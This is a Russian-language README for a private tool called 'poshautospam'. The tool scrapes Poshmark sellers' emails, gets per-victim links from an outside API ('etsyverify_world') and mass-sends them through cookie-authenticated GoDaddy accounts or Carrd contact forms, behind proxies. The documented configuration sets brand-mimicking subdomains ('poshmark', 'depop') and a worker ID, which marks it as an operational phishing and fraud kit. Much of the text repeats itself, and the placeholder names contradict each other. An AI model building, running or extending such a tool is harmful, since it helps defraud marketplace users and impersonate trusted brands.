# 📧 Автоматизированная система для отправки персонализированных сообщений

Этот репозиторий содержит две версии софта для отправки персонализированных сообщений:

1. **GoDaddy версия** - отправка через GoDaddy Email API (оригинальная версия)
2. **Carrd версия** - отправка через контактные формы Carrd сайтов (новая версия)

## 🎯 Основные возможности

- ✅ Парсинг объявлений Poshmark
- ✅ Валидация email адресов
- ✅ **Динамическая генерация персональных ссылок через API**
- ✅ **Автоматическое создание поддоменов (случайные или полу-случайные)**
- ✅ Отправка персонализированных сообщений
- ✅ Поддержка нескольких аккаунтов/сайтов одновременно
- ✅ Автоматическое управление невалидными аккаунтами/сайтами

## 📦 Две версии софта

### 1. GoDaddy версия (оригинальная)

**Использует:** GoDaddy Conversations API для отправки email

**Запуск:**
```bash
cd poshautospam
python main.py
```

**Требования:**
- JSON файлы с cookies GoDaddy аккаунтов в папке `poshautospam/cookies/`
- Настроенный `.env` файл

**Подробная документация:** См. `poshautospam/README.md`

---

### 2. Carrd версия (новая)

**Использует:** Контактные формы Carrd сайтов для отправки сообщений

**Запуск:**
```bash
python main_carrd.py
```

**Требования:**
- JSON файлы с конфигурациями Carrd сайтов в папке `carrd_sites/`
- Настроенный `.env` файл

**Подробная документация:** См. `README_CARRD.md`

## 🆚 Сравнение версий

| Характеристика | GoDaddy версия | Carrd версия |
|----------------|---------------|--------------|
| **Метод отправки** | Email через GoDaddy API | POST запросы к Carrd формам |
| **Аутентификация** | Cookie файлы аккаунтов | Конфигурация форм |
| **Настройка** | Средняя сложность | Простая |
| **Надежность** | Высокая | Средняя |
| **Лимиты** | ~2000 писем/аккаунт | Зависит от Carrd |
| **Стоимость** | Требует GoDaddy аккаунты | Требует Carrd сайты |

## 🚀 Быстрый старт

### Для GoDaddy версии:

1. Перейдите в папку `poshautospam/`
2. Скопируйте `.env.example` в `.env` и настройте
3. Поместите JSON файлы с cookies в `cookies/`
4. Запустите: `python main.py`

Подробнее: `poshautospam/README.md`

### Для Carrd версии:

1. Скопируйте `.env.example` в `.env` и настройте
2. Создайте JSON конфигурации для ваших Carrd сайтов в `carrd_sites/`
3. Отредактируйте шаблон сообщения в `Texts/text.txt`
4. Запустите: `python main_carrd.py`

Подробнее: `README_CARRD.md`

## 📋 Общие требования

- Python 3.10+
- Библиотеки из `pyproject.toml`
- Настроенный `.env` файл
- Прокси (опционально, но рекомендуется)

## ⚙️ Установка зависимостей

```bash
pip install -r requirements.txt
# или используя uv
uv pip install -r pyproject.toml
```

## 📊 Как работает (обе версии)

1. **Парсинг** - система парсит объявления с Poshmark для получения email адресов
2. **Валидация** - проверяет валидность email адресов
3. **Генерация ссылок** - создает персональные ссылки через API для каждого email
4. **Отправка** - отправляет сообщения с персональными ссылками:
   - GoDaddy: через Email API
   - Carrd: через контактные формы

## 🎨 Генерация персональных ссылок

API генерирует уникальную ссылку для каждого получателя. Система поддерживает 3 режима поддоменов:

- **random**: `abcd.domain.com/path` (4 случайных символа)
- **semi_random**: `poshmarkabcd.domain.com/path` (префикс + 4 символа)
- **none**: `domain.com/path` (без поддомена)

## 📝 Структура проекта

```
/
├── poshautospam/              # GoDaddy версия (оригинальная)
│   ├── src/
│   │   ├── main.py           # Основная логика GoDaddy
│   │   ├── GoDaddy.py        # Клиент GoDaddy API
│   │   └── ...
│   ├── cookies/              # Cookie файлы GoDaddy аккаунтов
│   ├── Texts/text.txt        # Шаблон сообщения
│   └── README.md             # Документация GoDaddy версии
│
├── src/
│   └── main_carrd.py         # Основная логика Carrd
│   └── Carrd.py              # Клиент Carrd форм
│
├── carrd_sites/              # Конфигурации Carrd сайтов
├── main_carrd.py             # Точка входа Carrd версии
├── README_CARRD.md           # Документация Carrd версии
├── .env.example              # Пример настроек для Carrd
└── README.md                 # Этот файл
```

## 🔧 Выбор версии

**Выбирайте GoDaddy версию если:**
- Нужна профессиональная email рассылка
- Требуется высокая доставляемость
- Есть доступ к GoDaddy аккаунтам
- Важна надежность отправки

**Выбирайте Carrd версию если:**
- Хотите использовать landing pages
- Не нужен полноценный email сервер
- Есть Carrd сайты с формами
- Нужна простая и быстрая настройка

## ⚠️ Важные примечания

1. **WORKER_ID обязателен** - укажите свой ID в `.env` для обеих версий
2. **Соблюдайте лимиты** - не превышайте разумные лимиты отправки
3. **Используйте прокси** - рекомендуется для обеих версий
4. **Тестируйте на малых объемах** - перед массовой рассылкой

## 📄 Лицензия

Приватный проект

---

**Удачной работы! 🚀**

## 🎯 Основные возможности

- ✅ Парсинг объявлений Poshmark
- ✅ Валидация email адресов
- ✅ **Динамическая генерация персональных ссылок через API**
- ✅ **Автоматическое создание поддоменов (случайные или полу-случайные)**
- ✅ Отправка персонализированных писем через GoDaddy
- ✅ Поддержка нескольких аккаунтов одновременно
- ✅ Автоматическое управление невалидными аккаунтами

## 📋 Требования

- Python 3.10+
- Библиотеки из `pyproject.toml`

## ⚙️ Настройка

### 1. Настройка `.env` файла

Скопируйте `.env.example` в `.env` и настройте параметры:

```bash
cp .env.example .env
```

#### Ключевые параметры:

**🔧 ID Работника (обязательно):**
```env
WORKER_ID=6932206485  # УКАЖИТЕ СВОЙ ID РАБОТНИКА
```

**🔗 API для генерации ссылок:**
```env
API_URL=https://arthas-api.com/obezyanaPidor
LINK_SERVICE=etsyverify_world
```

**🌐 Настройки поддоменов:**
```env
SUBDOMAIN_MODE=semi_random     # "random" | "semi_random" | "none"
SUBDOMAIN_PREFIX=poshmark      # Префикс для режима semi_random
```

### 2. Структура директорий

```
posh/
├── cookies/           # JSON файлы с куками GoDaddy аккаунтов
├── Texts/
│   └── text.txt      # Шаблон письма с {GENERATED_LINK}
├── spammed_godaddy/  # Аккаунты, достигшие лимита
├── bad_accounts/     # Невалидные аккаунты
└── logs/             # Логи работы
```

### 3. Шаблон письма

Откройте `Texts/text.txt` и убедитесь, что в нем есть плейсхолдер `{LINK}`:

```
🔗 Click here {LINK}
```

Система автоматически заменит `{LINK}` на сгенерированную ссылку **без https://**

**Примеры результата:**
- **random режим:** `abcd.domain.com/abc123` (4 случайных символа)
- **semi_random режим:** `poshmarkabcd.domain.com/abc123` (префикс + 4 символа)
- **none режим:** `domain.com/abc123` (без поддомена)

## 🚀 Запуск

```bash
python main.py
```

## 📊 Как работает генерация ссылок

### 1. API Запрос

Для каждого email система отправляет запрос на API:

```json
{
  "id": "6932206485",              // WORKER_ID из .env
  "title": "Item Title",           // Название товара из парсера
  "address": "Customer Address",   // DEFAULT_ADDRESS из .env
  "photo": "https://...",          // DEFAULT_PHOTO из .env
  "price": "25.00",                // DEFAULT_PRICE из .env
  "name": "Customer Name",         // Username из парсера
  "linkService": "etsyverify_world"
}
```

### 2. Генерация поддомена

API возвращает ссылку, например: `https://domain.com/abc123`

Система обрабатывает её:
- ✂️ Удаляет `https://`
- 🔀 В зависимости от `SUBDOMAIN_MODE`:
  - **random**: генерирует 4 случайных символа → `abcd`
  - **semi_random**: префикс + 4 символа → `poshmark` + `abcd` = `poshmarkabcd`
  - **none**: оставляет как есть
- 🔗 Формирует финальную ссылку: `poshmarkabcd.domain.com/abc123`

### 3. Персонализация

Каждый email получает **уникальную ссылку** с уникальным поддоменом.

## 🎨 Примеры конфигураций поддоменов

### Режим "random" - полностью случайный (4 символа)
```env
SUBDOMAIN_MODE=random
SUBDOMAIN_PREFIX=               # Игнорируется в этом режиме
```
Результат: `abcd.domain.com/path`, `x9k2.domain.com/path`, `fg4a.domain.com/path`

### Режим "semi_random" - префикс + 4 случайных символа
```env
SUBDOMAIN_MODE=semi_random
SUBDOMAIN_PREFIX=poshmark
```
Результат: `poshmarkabcd.domain.com/path`, `poshmarkx9k2.domain.com/path`

### Режим "semi_random" с другим префиксом
```env
SUBDOMAIN_MODE=semi_random
SUBDOMAIN_PREFIX=depop
```
Результат: `depopabcd.domain.com/path`, `depopx9k2.domain.com/path`

### Режим "none" - без поддомена
```env
SUBDOMAIN_MODE=none
```
Результат: `domain.com/path` (оригинальная ссылка от API)

## 📝 Логирование

Все действия логируются в:
- Консоль (цветной вывод)
- `logs/` директория

Примеры логов:
```
✅ Спарсено 20 email
✅ Валидных email: 15/20
🔗 Генерируем персональные ссылки для 15 email...
✅ Успешно сгенерировано ссылок: 15/15
🔗 Используем персональную ссылку: poshmarkfg4ad.domain.com/abc123
✅ Сообщение отправлено на user@gmail.com
```

## ⚠️ Важные примечания

1. **WORKER_ID обязателен** - убедитесь, что указали свой ID в `.env`
2. **Формат ответа API** - если ваш API возвращает ссылку в другом формате (не `{"link": "..."}` или `{"url": "..."}`), отредактируйте `src/link_generator.py`
3. **Плейсхолдер в шаблоне** - обязательно должен быть `{GENERATED_LINK}` в `Texts/text.txt`
4. **Лимиты API** - учитывайте rate limits вашего API (настройте `max_concurrent` в коде при необходимости)

## 🔧 Troubleshooting

### Ошибка "API не вернул ссылку"
Проверьте формат ответа вашего API и обновите `link_generator.py`:
```python
# В функции generate_link() найдите:
if "link" in data:
    original_link = data["link"]
elif "url" in data:
    original_link = data["url"]
# Добавьте свой ключ если другой
```

### Не генерируются поддомены
Убедитесь что:
```env
SUBDOMAIN_MODE=random  # или semi_random (не none)
```

### Ссылки с https://
Система автоматически удаляет `https://` и `http://`. Если ссылка все равно с протоколом, проверьте функцию `_remove_https()` в `link_generator.py`

## 📦 Структура проекта

```
src/
├── main.py              # Основной файл с логикой
├── link_generator.py    # 🆕 Генерация ссылок через API
├── GoDaddy.py          # Клиент для отправки через GoDaddy
├── ParserNew.py        # Парсер Poshmark
├── validator.py        # Валидация email
└── ...
```

## 📄 Лицензия

Приватный проект

---

**Удачной работы! 🚀**
